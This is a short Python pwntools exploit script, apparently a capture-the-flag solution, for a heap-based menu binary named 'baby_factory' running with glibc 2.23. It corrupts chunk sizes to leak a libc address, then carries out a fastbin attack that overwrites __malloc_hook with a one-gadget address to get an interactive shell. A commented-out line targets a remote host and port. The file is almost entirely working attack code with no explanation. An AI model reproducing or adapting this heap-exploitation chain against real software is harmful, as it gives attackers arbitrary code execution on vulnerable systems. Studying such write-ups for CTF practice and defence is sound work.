from pwn import *

def make_baby(sex,name,date):
	r.sendlineafter('>','1')
	r.sendlineafter('>',str(sex))
	r.sendafter('Name:',name)
	r.sendlineafter('Day:',str(date))

def edit_baby(idx,name):
	r.sendlineafter('>','2')
	r.sendlineafter('IDX:',str(idx))
	r.sendafter('name:',name)

def eli(idx):
	r.sendlineafter('>','4')
	r.sendlineafter('IDX:',str(idx))

def list():
	r.sendlineafter('>','3')

r=process('baby_factory',env={'LD_PRELOAD':'libc-2.23.so'})
#r=remote('137.117.216.128',13373)
libc=ELF('./libc-2.23.so')
oneshot=0xf02a4
#sex == 1 boy
#sex == 2 girl

make_baby(1,'A','-1')#0
make_baby(1,p64(0)*9+p64(0x71),'-1')#1
make_baby(1,'C','-1')#2

edit_baby(0,'\x91'*0x69)

eli(1)

make_baby(1,'\xb0','-1')
list()
r.recvuntil('[1] GIRL= ')
libc_base=u64(r.recvuntil('\x7f').ljust(8,'\x00'))-0x3c4bb0
log.info(hex(libc_base))
edit_baby(0,'\x71'*0x69)

eli(1)

make_baby(1,p64(0)+p64(0)+p64(0)+p64(0x71),'-1')

edit_baby(1,p64(libc_base+libc.symbols['__malloc_hook']-35)*3+p64(0x71)+p64(libc_base+libc.symbols['__malloc_hook']-35))
make_baby(1,p64(libc_base+libc.symbols['__malloc_hook']-35),'-1')
make_baby(1,'\x00'*19+p64(libc_base+oneshot),'-1')
eli(1)
#gdb.attach(r)
r.interactive()